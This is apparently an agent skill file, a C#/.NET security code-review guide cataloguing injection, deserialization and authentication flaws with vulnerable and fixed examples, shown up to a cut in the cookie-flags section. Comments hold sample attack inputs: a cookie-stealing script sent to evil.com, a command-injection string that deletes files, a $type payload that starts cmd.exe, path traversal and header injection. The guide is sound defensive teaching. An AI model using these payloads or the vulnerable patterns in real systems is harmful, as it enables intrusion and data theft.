---
name: cs-security-review
description: >-
  Review C# / .NET code for exploitable security vulnerabilities: SQL injection
  via string concatenation, command injection through Process.Start, XSS from
  unencoded user input, insecure deserialization (BinaryFormatter, TypeNameHandling),
  missing authorization attributes, hardcoded credentials, weak cryptography,
  path traversal, LDAP injection, JWT validation bypass, CORS misconfiguration,
  and secrets committed in appsettings.json. Trust boundary analysis across
  HTTP request pipeline, deserialization boundaries, and configuration surfaces.
  35 patterns across 5 categories with OWASP-aligned severity ratings sourced
  from OWASP Top 10, .NET Security Guidelines, Microsoft SDL, and NIST SSDF.
  Use this skill when reviewing C# code that handles user input, authentication,
  cryptography, serialization, or configuration in ASP.NET Core / .NET applications.
version: "1.0.0"
owner: "Agentic Engineering System"
---

# C# Security Code Review

## Quick Detection

**Primary Symptoms (in code under review)**:
- String concatenation or interpolation in SQL commands (`$"SELECT ... WHERE id = {userId}"`)
- `BinaryFormatter`, `SoapFormatter`, `ObjectStateFormatter`, or `LosFormatter` usage anywhere
- `TypeNameHandling` set to anything other than `None` in JSON.NET configuration
- `Process.Start` with arguments derived from user input
- Missing `[Authorize]` on controllers or actions handling sensitive data
- Hardcoded passwords, API keys, or connection strings in source files
- `MD5`, `SHA1`, `DES`, or `RC4` used for security purposes
- `new Random()` used for tokens, keys, or security-sensitive values
- `appsettings.json` containing secrets checked into source control
- `[AllowAnonymous]` on endpoints that modify state or return sensitive data

**Key Code Patterns to Search For**:
```csharp
// SQL Injection: string concatenation in query
var query = "SELECT * FROM Users WHERE Name = '" + userName + "'";
var cmd = new SqlCommand(query, connection);

// Command Injection: unsanitized input in Process.Start
Process.Start("cmd.exe", "/c " + userInput);

// Insecure Deserialization: BinaryFormatter (banned in .NET 9+)
var formatter = new BinaryFormatter();
var obj = formatter.Deserialize(stream);  // RCE if stream is untrusted

// Insecure Deserialization: JSON.NET TypeNameHandling
var settings = new JsonSerializerSettings {
    TypeNameHandling = TypeNameHandling.All  // Attacker controls deserialized type
};

// Missing Authorization
[HttpPost]
public IActionResult TransferFunds(TransferRequest request) { ... }  // No [Authorize]

// Hardcoded credentials
var connectionString = "Server=prod;Database=app;User=sa;Password=<REDACTED>";
```

## Analysis Workflow

### Step 1: Identify Trust Boundaries

Map all trust boundaries in the application:

1. **HTTP request boundary**: User input from query strings, headers, form data, JSON body
2. **Deserialization boundary**: JSON, XML, YAML, binary data from external sources
3. **File system boundary**: Uploaded files, user-specified paths, configuration files
4. **Database boundary**: Data read from database that originated from user input
5. **Inter-service boundary**: Data from other services, message queues, gRPC calls

For each boundary, list:
| Boundary | From (untrusted) | To (trusted) | Mechanism |
|----------|-----------------|--------------|-----------|
| HTTP | Browser/client | Controller action | Model binding |
| Deserialization | External JSON/XML | .NET object | JsonSerializer / XmlSerializer |
| File system | User upload | Server file system | IFormFile / file path |
| Database | Stored user input | Application logic | EF Core / ADO.NET query |

### Step 2: Apply Security Patterns

Apply the 35 patterns from the C# Security Rubric organized by category.

**Priority order** (by severity and exploitability):

| Category | Patterns | Severity Range | OWASP Mapping |
|----------|----------|---------------|---------------|
| Injection | SEC-INJ-01 through SEC-INJ-10 | Critical-Medium | A03:2021 Injection |
| Deserialization | SEC-DESER-01 through SEC-DESER-08 | Critical-Medium | A08:2021 Software & Data Integrity |
| Auth & Authorization | SEC-AUTH-01 through SEC-AUTH-08 | Critical-Medium | A01:2021 Broken Access Control, A07:2021 Auth Failures |
| Cryptography | SEC-CRYPTO-01 through SEC-CRYPTO-06 | Critical-Low | A02:2021 Cryptographic Failures |
| Secrets & Config | SEC-CFG-01 through SEC-CFG-05 | Critical-Medium | A05:2021 Security Misconfiguration |

### Step 3: Security-Specific Analysis

For each finding at a trust boundary:

1. **Exploitability assessment**: Can an attacker control the input that triggers the vulnerability?
2. **Severity rating**: Critical / High / Medium / Low
3. **OWASP category mapping**: Which OWASP Top 10 (2021) category applies?
4. **Attack scenario**: Describe concrete exploitation path
5. **Data at risk**: What data or functionality is exposed?

### Step 4: Generate Fix

**Fix Strategy by Security Category**:

```
Injection?
+-- SQL injection --> Use parameterized queries / EF Core LINQ
+-- Command injection --> Avoid Process.Start with user input; use allowlist
+-- XSS --> Use Razor encoding, HtmlEncoder, Content Security Policy
+-- LDAP injection --> Use LdapFilterEncoder or parameterized LDAP queries
+-- Path traversal --> Canonicalize path, validate within allowed root
+-- Log injection --> Sanitize newlines, use structured logging

Deserialization?
+-- BinaryFormatter --> Replace with System.Text.Json or protobuf
+-- TypeNameHandling --> Set to None; use known-type discriminator pattern
+-- XmlSerializer type --> Restrict to known types, never from user input
+-- YAML --> Use YamlDotNet with safe type restrictions

Authentication & Authorization?
+-- Missing [Authorize] --> Add attribute with appropriate policy
+-- JWT bypass --> Enable all validation flags (issuer, audience, lifetime)
+-- CORS misconfiguration --> Specify exact allowed origins, remove AllowCredentials with wildcard
+-- Missing anti-forgery --> Add [ValidateAntiForgeryToken] on POST/PUT/DELETE

Cryptography?
+-- Weak algorithm --> Use SHA-256+, AES-256, RSA-2048+
+-- Hardcoded key --> Use Azure Key Vault, DPAPI, or user-secrets
+-- ECB mode --> Use CBC with random IV, or GCM for AEAD
+-- Insecure random --> Use RandomNumberGenerator for security values
```

**Fix template**:
```markdown
#### Finding: [Pattern-ID] -- [Brief description]
**File**: `path/to/file.cs` lines N-M
**Severity**: [Critical|High|Medium|Low]
**OWASP**: [Category ID and name]
**Pattern**: [Pattern ID from catalog]
**Attack Scenario**: [How an attacker exploits this]

**Before** (vulnerable):
```csharp
// Vulnerable code
```

**After** (hardened):
```csharp
// Fixed code with security controls
```

**Verification**:
- [ ] All user input validated/sanitized at trust boundary
- [ ] Parameterized queries used for all database access
- [ ] Serialization restricted to known types
- [ ] Authorization attributes present on all sensitive endpoints
- [ ] Secrets stored in secure configuration provider
- [ ] Build succeeds with security analyzers enabled
```

### Step 5: Verify Fix

1. **Input validation audit**: Confirm every input from untrusted source is validated at the boundary
2. **Serialization audit**: All deserialization restricted to known types with no arbitrary type loading
3. **Authorization audit**: Every controller/action has appropriate `[Authorize]` or explicit `[AllowAnonymous]` with justification
4. **Secrets audit**: No plaintext secrets in source; all secrets from Key Vault / user-secrets / environment
5. **Static analysis**: Run Roslyn security analyzers, `dotnet format --verify-no-changes`, and CodeQL if available

## Pattern Catalog

### Injection Patterns

#### SEC-INJ-01: SQL Injection via String Concatenation/Interpolation
**Severity**: Critical
**OWASP**: A03:2021 Injection
**Source**: OWASP Top 10, Microsoft SDL

**Signal**: String concatenation (`+`) or interpolation (`$""`) used to build SQL command text with user-supplied values.

```csharp
// BAD: SQL injection via concatenation
var query = "SELECT * FROM Users WHERE Username = '" + username + "'";
var cmd = new SqlCommand(query, connection);
// Attacker sends: ' OR 1=1 --

// BAD: SQL injection via interpolation
var cmd = new SqlCommand($"SELECT * FROM Orders WHERE CustomerId = {customerId}", conn);

// GOOD: Parameterized query
var cmd = new SqlCommand("SELECT * FROM Users WHERE Username = @username", connection);
cmd.Parameters.AddWithValue("@username", username);

// GOOD: EF Core LINQ (parameterized automatically)
var user = await dbContext.Users.FirstOrDefaultAsync(u => u.Username == username);
```

**Fix**: Always use parameterized queries (`SqlParameter`) or ORM-generated queries (EF Core LINQ). Never build SQL strings from user input.

---

#### SEC-INJ-02: Command Injection via Process.Start
**Severity**: Critical
**OWASP**: A03:2021 Injection
**Source**: OWASP Top 10, Microsoft SDL

**Signal**: `Process.Start` or `ProcessStartInfo` with `Arguments` or `FileName` derived from user input without validation.

```csharp
// BAD: Command injection
var startInfo = new ProcessStartInfo("cmd.exe", "/c ping " + userHostname);
Process.Start(startInfo);
// Attacker sends: 127.0.0.1 & del /f /q C:\*

// BAD: Filename from user input
Process.Start(userSuppliedPath);

// GOOD: Allowlist validation + no shell
var startInfo = new ProcessStartInfo
{
    FileName = "ping",
    Arguments = validatedHostname, // Validated against hostname regex
    UseShellExecute = false,
    CreateNoWindow = true
};
if (!Regex.IsMatch(validatedHostname, @"^[a-zA-Z0-9.\-]+$"))
    throw new ArgumentException("Invalid hostname");
Process.Start(startInfo);
```

**Fix**: Avoid `Process.Start` with user input entirely. If unavoidable, use strict allowlist validation, set `UseShellExecute = false`, and never pass input through a shell interpreter.

---

#### SEC-INJ-03: Cross-Site Scripting (XSS)
**Severity**: Critical
**OWASP**: A03:2021 Injection
**Source**: OWASP Top 10, .NET Security Guidelines

**Signal**: User input rendered in HTML/JavaScript without encoding. Watch for `@Html.Raw()`, direct string writes to response, or JavaScript string embedding.

```csharp
// BAD: XSS via Html.Raw
<p>Welcome, @Html.Raw(Model.UserName)</p>
// Attacker sets username to: <script>document.location='https://evil.com/steal?c='+document.cookie</script>

// BAD: XSS via direct response write
await context.Response.WriteAsync($"<p>Search results for: {query}</p>");

// GOOD: Razor auto-encodes by default
<p>Welcome, @Model.UserName</p>

// GOOD: Explicit encoding when needed
@using Microsoft.AspNetCore.Html
<p>Search results for: @HtmlEncoder.Default.Encode(query)</p>

// GOOD: Content Security Policy header
app.Use(async (context, next) =>
{
    context.Response.Headers.Append("Content-Security-Policy", "default-src 'self'");
    await next();
});
```

**Fix**: Rely on Razor's automatic encoding. Never use `Html.Raw()` with user input. Add CSP headers. For JavaScript contexts, use `JavaScriptEncoder`.

---

#### SEC-INJ-04: LDAP Injection
**Severity**: High
**OWASP**: A03:2021 Injection
**Source**: OWASP Top 10

**Signal**: User input concatenated into LDAP filter strings without escaping.

```csharp
// BAD: LDAP injection
var filter = $"(&(uid={username})(userPassword={password}))";
var searcher = new DirectorySearcher(filter);
// Attacker sends username: *)(uid=*))(|(uid=*

// GOOD: Escape LDAP special characters
var safeUsername = LdapFilterEncoder.Encode(username);
var safePassword = LdapFilterEncoder.Encode(password);
var filter = $"(&(uid={safeUsername})(userPassword={safePassword}))";
```

**Fix**: Use `LdapFilterEncoder.Encode()` (or equivalent) on all user-supplied values before inserting into LDAP filters. Better yet, use parameterized LDAP queries if your library supports them.

---

#### SEC-INJ-05: Path Traversal
**Severity**: High
**OWASP**: A03:2021 Injection
**Source**: OWASP Top 10, .NET Security Guidelines

**Signal**: User input used in file path construction without canonicalization or root directory validation.

```csharp
// BAD: Path traversal
var filePath = Path.Combine(uploadsFolder, userFileName);
var content = System.IO.File.ReadAllText(filePath);
// Attacker sends: ../../../etc/passwd or ..\..\web.config

// GOOD: Canonicalize and validate
var fullPath = Path.GetFullPath(Path.Combine(uploadsFolder, userFileName));
if (!fullPath.StartsWith(Path.GetFullPath(uploadsFolder), StringComparison.OrdinalIgnoreCase))
    throw new UnauthorizedAccessException("Access denied: path traversal detected");
var content = System.IO.File.ReadAllText(fullPath);
```

**Fix**: Always canonicalize paths with `Path.GetFullPath()`, then verify the result starts with the allowed root directory. Strip or reject input containing `..`, `:`, or null bytes.

---

#### SEC-INJ-06: XML Injection
**Severity**: High
**OWASP**: A03:2021 Injection
**Source**: OWASP, .NET Security Guidelines

**Signal**: User input embedded in XML strings without encoding, or `XmlDocument` loaded with external entity processing enabled.

```csharp
// BAD: XML injection / XXE
var xml = $"<user><name>{userInput}</name></user>";
var doc = new XmlDocument();
doc.LoadXml(xml);
// Attacker sends: </name><admin>true</admin><name>

// BAD: XXE enabled (default in older .NET Framework)
var doc = new XmlDocument();
doc.XmlResolver = new XmlUrlResolver(); // Allows external entity loading
doc.LoadXml(untrustedXml);

// GOOD: Encode input and disable XXE
var xml = $"<user><name>{SecurityElement.Escape(userInput)}</name></user>";

// GOOD: Disable external entities
var doc = new XmlDocument();
doc.XmlResolver = null; // Disable XXE
doc.LoadXml(untrustedXml);

// GOOD: Use XmlReader with safe settings
var settings = new XmlReaderSettings
{
    DtdProcessing = DtdProcessing.Prohibit,
    XmlResolver = null
};
using var reader = XmlReader.Create(stream, settings);
```

**Fix**: Use `SecurityElement.Escape()` for XML encoding. Disable DTD processing and set `XmlResolver = null`. Prefer `XmlReader` with restrictive `XmlReaderSettings`.

---

#### SEC-INJ-07: Log Injection
**Severity**: Medium
**OWASP**: A09:2021 Security Logging and Monitoring Failures
**Source**: OWASP, ASP.NET Core security guidance

**Signal**: User input written directly to log output without sanitization, enabling forged log entries via newline injection.

```csharp
// BAD: Log injection via newlines
logger.LogInformation("User login: " + username);
// Attacker sends: admin\n2024-01-01 INFO User login successful: admin

// BAD: Even with structured logging, raw concatenation is dangerous
logger.LogInformation($"Processing request for {userInput}");

// GOOD: Use structured logging with message templates
logger.LogInformation("User login: {Username}", username);

// GOOD: Sanitize if string formatting is unavoidable
var sanitized = username.Replace("\n", "").Replace("\r", "");
logger.LogInformation("User login: {Username}", sanitized);
```

**Fix**: Always use structured logging with message templates (the `{Placeholder}` syntax) rather than string concatenation or interpolation. This lets the logging framework handle encoding.

---

#### SEC-INJ-08: Regex Injection (ReDoS)
**Severity**: Medium
**OWASP**: A03:2021 Injection
**Source**: OWASP, .NET Security Guidelines

**Signal**: User input used directly as a regex pattern without escaping, enabling Regular Expression Denial of Service.

```csharp
// BAD: ReDoS via user-controlled pattern
var regex = new Regex(userPattern);
var match = regex.IsMatch(inputText);
// Attacker sends: (a+)+$ with input "aaaaaaaaaaaaaaaaX" -- exponential backtracking

// GOOD: Escape user input if used as literal pattern
var regex = new Regex(Regex.Escape(userPattern));

// GOOD: Set timeout to limit backtracking
var regex = new Regex(pattern, RegexOptions.None, TimeSpan.FromSeconds(1));

// GOOD: Use compiled regex with known patterns only
[GeneratedRegex(@"^[a-zA-Z0-9]+$")]
private static partial Regex SafePattern();
```

**Fix**: Never use user input as a regex pattern without `Regex.Escape()`. Always set `matchTimeout` on `Regex` constructors. Prefer source-generated regexes for known patterns.

---

#### SEC-INJ-09: LINQ-to-SQL ExecuteQuery with String Concatenation
**Severity**: High
**OWASP**: A03:2021 Injection
**Source**: OWASP, Microsoft SDL

**Signal**: `DataContext.ExecuteQuery` or `Database.SqlQuery` called with concatenated/interpolated SQL strings.

```csharp
// BAD: SQL injection through ExecuteQuery
var results = db.ExecuteQuery<User>(
    "SELECT * FROM Users WHERE Email = '" + email + "'");

// BAD: SQL injection through FromSqlRaw
var users = dbContext.Users
    .FromSqlRaw($"SELECT * FROM Users WHERE Email = '{email}'")
    .ToList();

// GOOD: Parameterized ExecuteQuery
var results = db.ExecuteQuery<User>(
    "SELECT * FROM Users WHERE Email = {0}", email);

// GOOD: FromSqlInterpolated (auto-parameterizes)
var users = dbContext.Users
    .FromSqlInterpolated($"SELECT * FROM Users WHERE Email = {email}")
    .ToList();
```

**Fix**: Use `FromSqlInterpolated` (which auto-parameterizes) instead of `FromSqlRaw` with concatenation. For `ExecuteQuery`, use positional parameters (`{0}`, `{1}`).

---

#### SEC-INJ-10: HTTP Header Injection
**Severity**: High
**OWASP**: A03:2021 Injection
**Source**: OWASP, .NET Security Guidelines

**Signal**: User input placed directly into HTTP response headers without validation, enabling header injection or response splitting.

```csharp
// BAD: Header injection
Response.Headers.Append("X-Custom-Header", userInput);
// Attacker sends: value\r\nSet-Cookie: admin=true

// BAD: Redirect with unvalidated URL
return Redirect(userSuppliedUrl);
// Attacker sends: https://evil.com or javascript:alert(1)

// GOOD: Validate and sanitize header values
var sanitized = userInput.Replace("\r", "").Replace("\n", "");
Response.Headers.Append("X-Custom-Header", sanitized);

// GOOD: Validate redirect URLs
if (!Url.IsLocalUrl(returnUrl))
    returnUrl = "/";
return LocalRedirect(returnUrl);
```

**Fix**: Strip CR/LF from any user input placed in headers. Use `LocalRedirect` and `Url.IsLocalUrl()` for redirect targets. Never embed raw user input in response headers.

---

### Deserialization Patterns

#### SEC-DESER-01: BinaryFormatter Usage
**Severity**: Critical
**OWASP**: A08:2021 Software and Data Integrity Failures
**Source**: Microsoft SDL, .NET Security Guidelines (banned in .NET 9+)

**Signal**: Any usage of `BinaryFormatter.Deserialize()`. This is an inherently unsafe API that enables Remote Code Execution regardless of the input source.

```csharp
// BAD: BinaryFormatter -- RCE vulnerability (banned in .NET 9+)
var formatter = new BinaryFormatter();
var obj = formatter.Deserialize(networkStream);  // Attacker controls type instantiation

// BAD: Even with SerializationBinder, BinaryFormatter is not safe
var formatter = new BinaryFormatter();
formatter.Binder = new SafeBinder();  // Bypasses exist
var obj = formatter.Deserialize(stream);

// GOOD: Use System.Text.Json
var obj = await JsonSerializer.DeserializeAsync<MyType>(stream);

// GOOD: Use protobuf for binary serialization
var obj = Serializer.Deserialize<MyType>(stream);
```

**Fix**: Remove all `BinaryFormatter` usage. Migrate to `System.Text.Json`, `protobuf-net`, or `MessagePack`. There is no safe way to use `BinaryFormatter` with untrusted input. Set `<EnableUnsafeBinaryFormatterSerialization>false</EnableUnsafeBinaryFormatterSerialization>` in project file.

---

#### SEC-DESER-02: JSON.NET TypeNameHandling Misconfiguration
**Severity**: Critical
**OWASP**: A08:2021 Software and Data Integrity Failures
**Source**: OWASP, deserialization vulnerability research

**Signal**: `TypeNameHandling` set to `All`, `Auto`, `Objects`, or `Arrays` in `JsonSerializerSettings`.

```csharp
// BAD: TypeNameHandling.All -- attacker controls deserialized type
var settings = new JsonSerializerSettings
{
    TypeNameHandling = TypeNameHandling.All
};
var obj = JsonConvert.DeserializeObject(untrustedJson, settings);
// Attacker sends: {"$type":"System.Diagnostics.Process, System","StartInfo":{"FileName":"cmd.exe"}}

// BAD: TypeNameHandling.Auto -- same risk when interface/object types exist
var settings = new JsonSerializerSettings
{
    TypeNameHandling = TypeNameHandling.Auto
};

// GOOD: TypeNameHandling.None (default)
var settings = new JsonSerializerSettings
{
    TypeNameHandling = TypeNameHandling.None
};

// GOOD: If polymorphism is needed, use a custom SerializationBinder with strict allowlist
var settings = new JsonSerializerSettings
{
    TypeNameHandling = TypeNameHandling.Auto,
    SerializationBinder = new KnownTypesBinder(
        typeof(DerivedTypeA),
        typeof(DerivedTypeB))
};

// GOOD: Use System.Text.Json with [JsonDerivedType] (.NET 7+)
[JsonPolymorphic]
[JsonDerivedType(typeof(DerivedA), "a")]
[JsonDerivedType(typeof(DerivedB), "b")]
public abstract class BaseType { }
```

**Fix**: Set `TypeNameHandling = TypeNameHandling.None`. If polymorphic deserialization is required, use `System.Text.Json` with `[JsonDerivedType]` or a strict `ISerializationBinder` allowlist.

---

#### SEC-DESER-03: XmlSerializer with User-Controlled Type
**Severity**: High
**OWASP**: A08:2021 Software and Data Integrity Failures
**Source**: OWASP, Microsoft SDL

**Signal**: `XmlSerializer` constructor receives a `Type` parameter derived from user input.

```csharp
// BAD: User controls deserialized type
var typeName = request.Headers["X-Type-Name"];
var type = Type.GetType(typeName);
var serializer = new XmlSerializer(type);  // Attacker chooses type
var obj = serializer.Deserialize(stream);

// GOOD: Use a fixed, known type
var serializer = new XmlSerializer(typeof(MyKnownType));
var obj = (MyKnownType)serializer.Deserialize(stream);

// GOOD: Allowlist if dynamic type is needed
var allowedTypes = new HashSet<string> { "MyApp.TypeA", "MyApp.TypeB" };
if (!allowedTypes.Contains(typeName))
    throw new InvalidOperationException("Type not allowed");
```

**Fix**: Never pass user-controlled type names to `XmlSerializer`. Use a fixed type or strict allowlist.

---

#### SEC-DESER-04: DataContractSerializer with Arbitrary KnownTypes
**Severity**: High
**OWASP**: A08:2021 Software and Data Integrity Failures
**Source**: Microsoft SDL

**Signal**: `DataContractSerializer` configured with `[KnownType]` attributes that resolve to user-controlled or overly broad type sets.

```csharp
// BAD: KnownType resolves arbitrary types
[DataContract]
[KnownType(nameof(GetKnownTypes))]
public class Message
{
    static IEnumerable<Type> GetKnownTypes()
    {
        return AppDomain.CurrentDomain.GetAssemblies()
            .SelectMany(a => a.GetTypes())  // Every type in the AppDomain!
            .Where(t => t.IsSerializable);
    }
}

// GOOD: Explicit, minimal known types
[DataContract]
[KnownType(typeof(TextMessage))]
[KnownType(typeof(ImageMessage))]
public class Message { }
```

**Fix**: Explicitly enumerate `[KnownType]` attributes. Never dynamically resolve types from assemblies or user input.

---

#### SEC-DESER-05: Custom JsonConverter Without Input Validation
**Severity**: Medium
**OWASP**: A08:2021 Software and Data Integrity Failures
**Source**: .NET Security Guidelines

**Signal**: Custom `JsonConverter` that reads type information or constructs objects from JSON without validation.

```csharp
// BAD: Custom converter creates types from JSON content
public class UnsafeConverter : JsonConverter
{
    public override object ReadJson(JsonReader reader, Type objectType,
        object existingValue, JsonSerializer serializer)
    {
        var typeName = JObject.Load(reader)["type"].ToString();
        var type = Type.GetType(typeName);  // Attacker-controlled type resolution
        return Activator.CreateInstance(type);
    }
}

// GOOD: Validate against allowlist
public override object ReadJson(JsonReader reader, Type objectType,
    object existingValue, JsonSerializer serializer)
{
    var jo = JObject.Load(reader);
    var discriminator = jo["type"]?.ToString();
    return discriminator switch
    {
        "text" => jo.ToObject<TextMessage>(serializer),
        "image" => jo.ToObject<ImageMessage>(serializer),
        _ => throw new JsonSerializationException($"Unknown type: {discriminator}")
    };
}
```

**Fix**: Never use `Type.GetType()` or `Activator.CreateInstance()` with values from JSON. Use a discriminator pattern with explicit switch/map.

---

#### SEC-DESER-06: SoapFormatter Usage
**Severity**: Critical
**OWASP**: A08:2021 Software and Data Integrity Failures
**Source**: Microsoft SDL

**Signal**: Usage of `System.Runtime.Serialization.Formatters.Soap.SoapFormatter`. Same RCE risk as `BinaryFormatter`.

```csharp
// BAD: SoapFormatter -- same RCE risk as BinaryFormatter
var formatter = new SoapFormatter();
var obj = formatter.Deserialize(stream);

// GOOD: Use System.Text.Json or protobuf
var obj = await JsonSerializer.DeserializeAsync<MyType>(stream);
```

**Fix**: Remove all `SoapFormatter` usage. Same migration path as `BinaryFormatter` (SEC-DESER-01).

---

#### SEC-DESER-07: ObjectStateFormatter / LosFormatter with Untrusted Input
**Severity**: Critical
**OWASP**: A08:2021 Software and Data Integrity Failures
**Source**: Microsoft SDL, ysoserial.net

**Signal**: `ObjectStateFormatter` or `LosFormatter` deserializing untrusted data (common in legacy ASP.NET ViewState).

```csharp
// BAD: ObjectStateFormatter with untrusted input
var formatter = new ObjectStateFormatter();
var state = formatter.Deserialize(untrustedBase64);

// BAD: LosFormatter with untrusted input
var formatter = new LosFormatter();
var obj = formatter.Deserialize(untrustedString);

// GOOD: Use signed/encrypted ViewState with machineKey validation
// Or migrate to ASP.NET Core which doesn't use ViewState

// GOOD: For state transfer, use typed JSON serialization
var state = JsonSerializer.Deserialize<PageState>(signedAndVerifiedPayload);
```

**Fix**: Migrate away from `ObjectStateFormatter`/`LosFormatter`. If ViewState is required, ensure MAC validation is enabled and `machineKey` is properly configured. Prefer ASP.NET Core's approach.

---

#### SEC-DESER-08: YAML Deserialization Without Type Restrictions
**Severity**: High
**OWASP**: A08:2021 Software and Data Integrity Failures
**Source**: OWASP, SnakeYaml-equivalent attacks

**Signal**: YAML deserialization (e.g., `YamlDotNet`) with unsafe type resolvers or `!tag` processing enabled.

```csharp
// BAD: YamlDotNet with arbitrary type resolution
var deserializer = new DeserializerBuilder()
    .WithTagMapping("!custom", typeof(object))  // Broad type mapping
    .Build();
var result = deserializer.Deserialize<object>(untrustedYaml);

// GOOD: Strict type deserialization
var deserializer = new DeserializerBuilder()
    .IgnoreUnmatchedProperties()
    .Build();
var result = deserializer.Deserialize<MyConfigType>(yamlContent);

// GOOD: Use safe load with known types only
var deserializer = new DeserializerBuilder()
    .WithTypeDiscriminatingNodeDeserializer(options =>
    {
        options.AddKeyValueTypeDiscriminator<BaseConfig>("type",
            new Dictionary<string, Type>
            {
                { "database", typeof(DatabaseConfig) },
                { "cache", typeof(CacheConfig) }
            });
    })
    .Build();
```

**Fix**: Always deserialize YAML into explicit types. Disable arbitrary type tags. Use type discriminators with allowlists for polymorphic YAML.

---

### Authentication & Authorization Patterns

#### SEC-AUTH-01: Missing [Authorize] on Sensitive Endpoint
**Severity**: High
**OWASP**: A01:2021 Broken Access Control
**Source**: OWASP Top 10, ASP.NET Core Security Guidelines

**Signal**: Controller or action handling sensitive operations (data modification, PII access, admin functions) without `[Authorize]` attribute.

```csharp
// BAD: No authorization on sensitive endpoint
[ApiController]
[Route("api/[controller]")]
public class UsersController : ControllerBase
{
    [HttpDelete("{id}")]
    public async Task<IActionResult> DeleteUser(int id)  // Anyone can delete users!
    {
        await _userService.DeleteAsync(id);
        return NoContent();
    }
}

// GOOD: Authorization required with appropriate policy
[ApiController]
[Route("api/[controller]")]
[Authorize]
public class UsersController : ControllerBase
{
    [HttpDelete("{id}")]
    [Authorize(Policy = "AdminOnly")]
    public async Task<IActionResult> DeleteUser(int id)
    {
        await _userService.DeleteAsync(id);
        return NoContent();
    }
}
```

**Fix**: Add `[Authorize]` at controller level for all sensitive controllers. Add policy-based authorization for role-specific operations. Consider using a global authorization filter with explicit `[AllowAnonymous]` only where needed.

---

#### SEC-AUTH-02: [AllowAnonymous] on Sensitive Data Endpoint
**Severity**: High
**OWASP**: A01:2021 Broken Access Control
**Source**: OWASP Top 10, ASP.NET Core Security Guidelines

**Signal**: `[AllowAnonymous]` applied to endpoints that return PII, modify state, or perform privileged operations.

```csharp
// BAD: AllowAnonymous on endpoint returning sensitive data
[Authorize]
[ApiController]
public class AccountController : ControllerBase
{
    [AllowAnonymous]  // Overrides controller-level [Authorize]
    [HttpGet("profile")]
    public async Task<IActionResult> GetProfile()
    {
        return Ok(await _userService.GetUserProfile(UserId));  // PII exposed
    }
}

// GOOD: AllowAnonymous only on truly public endpoints
[Authorize]
[ApiController]
public class AccountController : ControllerBase
{
    [AllowAnonymous]
    [HttpGet("health")]  // Health check is genuinely public
    public IActionResult Health() => Ok();

    [HttpGet("profile")]  // Inherits controller-level [Authorize]
    public async Task<IActionResult> GetProfile()
    {
        return Ok(await _userService.GetUserProfile(UserId));
    }
}
```

**Fix**: Audit every `[AllowAnonymous]` usage. It should only appear on login, registration, health check, and public content endpoints. Document the justification for each `[AllowAnonymous]` usage.

---

#### SEC-AUTH-03: Hardcoded Credentials in Source Code
**Severity**: Critical
**OWASP**: A07:2021 Identification and Authentication Failures
**Source**: OWASP Top 10, Microsoft SDL, NIST SSDF

**Signal**: Passwords, API keys, connection strings with credentials, or tokens hardcoded in source files.

```csharp
// BAD: Hardcoded password
var connection = new SqlConnection(
    "Server=prod-db;Database=app;User Id=sa;Password=<REDACTED>");

// BAD: Hardcoded API key
private const string ApiKey = "sk-proj-abc123def456ghi789";

// BAD: Hardcoded in configuration class
public class AuthConfig
{
    public string JwtSecret { get; set; } = "my-super-secret-jwt-key-12345";
}

// GOOD: Read from secure configuration
var connection = new SqlConnection(configuration.GetConnectionString("DefaultConnection"));

// GOOD: Use Azure Key Vault
var apiKey = await keyVaultClient.GetSecretAsync("api-key");

// GOOD: Use user secrets in development
// dotnet user-secrets set "JwtSecret" "dev-only-secret"
var jwtSecret = configuration["JwtSecret"];
```

**Fix**: Remove all hardcoded credentials immediately. Use `dotnet user-secrets` for development, environment variables for CI, and Azure Key Vault (or equivalent) for production. Rotate any credentials that were committed to source control.

---

#### SEC-AUTH-04: Custom Authentication Instead of Framework Middleware
**Severity**: High
**OWASP**: A07:2021 Identification and Authentication Failures
**Source**: .NET Security Guidelines

**Signal**: Hand-rolled authentication logic (password hashing, token generation, session management) instead of ASP.NET Core Identity or authentication middleware.

```csharp
// BAD: Custom password hashing
public bool ValidateUser(string username, string password)
{
    var user = _db.Users.Find(username);
    var hash = SHA256.HashData(Encoding.UTF8.GetBytes(password + user.Salt));
    return hash.SequenceEqual(user.PasswordHash);  // Timing attack + weak hash
}

// BAD: Custom JWT generation without proper validation
var token = Convert.ToBase64String(
    Encoding.UTF8.GetBytes($"{userId}:{DateTime.UtcNow.AddHours(1)}"));

// GOOD: Use ASP.NET Core Identity
services.AddIdentity<ApplicationUser, IdentityRole>()
    .AddEntityFrameworkStores<AppDbContext>()
    .AddDefaultTokenProviders();

// GOOD: Use framework JWT bearer authentication
services.AddAuthentication(JwtBearerDefaults.AuthenticationScheme)
    .AddJwtBearer(options =>
    {
        options.Authority = "https://login.example.com";
        options.Audience = "my-api";
    });
```

**Fix**: Use ASP.NET Core's built-in authentication middleware. Use `Identity` for user management and `PasswordHasher<T>` for password hashing. Use established JWT libraries with proper validation.

---

#### SEC-AUTH-05: JWT Validation Disabled
**Severity**: Critical
**OWASP**: A07:2021 Identification and Authentication Failures
**Source**: OWASP, .NET Security Guidelines

**Signal**: `TokenValidationParameters` with validation flags set to `false` (issuer, audience, lifetime, signature).

```csharp
// BAD: Validation disabled -- accepts any token
services.AddAuthentication().AddJwtBearer(options =>
{
    options.TokenValidationParameters = new TokenValidationParameters
    {
        ValidateIssuer = false,        // Any issuer accepted
        ValidateAudience = false,      // Any audience accepted
        ValidateLifetime = false,      // Expired tokens accepted
        ValidateIssuerSigningKey = false // Signature not verified!
    };
});

// GOOD: All validation enabled
services.AddAuthentication().AddJwtBearer(options =>
{
    options.TokenValidationParameters = new TokenValidationParameters
    {
        ValidateIssuer = true,
        ValidIssuer = "https://auth.example.com",
        ValidateAudience = true,
        ValidAudience = "my-api",
        ValidateLifetime = true,
        ClockSkew = TimeSpan.FromMinutes(2),
        ValidateIssuerSigningKey = true,
        IssuerSigningKey = new SymmetricSecurityKey(keyBytes)
    };
});
```

**Fix**: Enable all validation flags. Set explicit valid issuer, audience, and signing key. Keep `ClockSkew` small (default 5 minutes may be too generous).

---

#### SEC-AUTH-06: Cookie Missing Security Flags
**Severity**: High
**OWASP**: A07:2021 Identification and Authentication Failures
**Source**: OWASP, .NET Security Guidelines

**Signal**: Authentication or session cookies created without `Secure`, `HttpOnly`, or `SameSite` flags.

```csharp
// BAD: Cookie without security flags
Response.Cookies.Append("session", sessionId);

// BAD: Explicit insecure options
Response.Cookies.Append("auth", token, new CookieOptions
{
    HttpOnly = false,    // Accessible via JavaScript (XSS can steal it)
    Secure = false,      // Sent over HTTP (interceptable)
    SameSite = SameSiteMode.None  // Without Secure, ignored by browsers
});

